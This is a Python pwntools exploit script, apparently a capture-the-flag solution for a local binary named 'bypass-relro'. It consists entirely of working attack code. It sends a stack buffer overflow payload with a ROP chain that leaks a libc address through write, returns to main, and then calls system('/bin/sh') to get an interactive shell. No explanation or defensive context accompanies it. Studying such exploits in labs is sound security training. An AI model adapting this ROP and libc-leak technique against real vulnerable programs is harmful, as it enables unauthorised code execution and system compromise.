from pwn import *

p = process('./bypass-relro')

pop_rdi = 0x40117e
pop_rsi = 0x401180
pop_rdx = 0x401182

write_plt = 0x401060

p.recvuntil(b': ')

pay = b'a' * 0x48

pay += p64(pop_rdi) + p64(1)
pay += p64(pop_rsi) + p64(0x403fd8)
pay += p64(pop_rdx) + p64(0x8)
pay += p64(write_plt)

pay += p64(0x401234) # main

p.send(pay)

libc = u64(p.recv(8)) - 0x114870
system = libc + 0x50d70
binsh = libc + 0x1d8678
print(hex(libc))

p.recvuntil(b': ')

pay = b'a' * 0x48
pay += p64(pop_rdi) + p64(binsh)
pay += p64(pop_rdi + 1)
pay += p64(system)
p.send(pay)

p.interactive()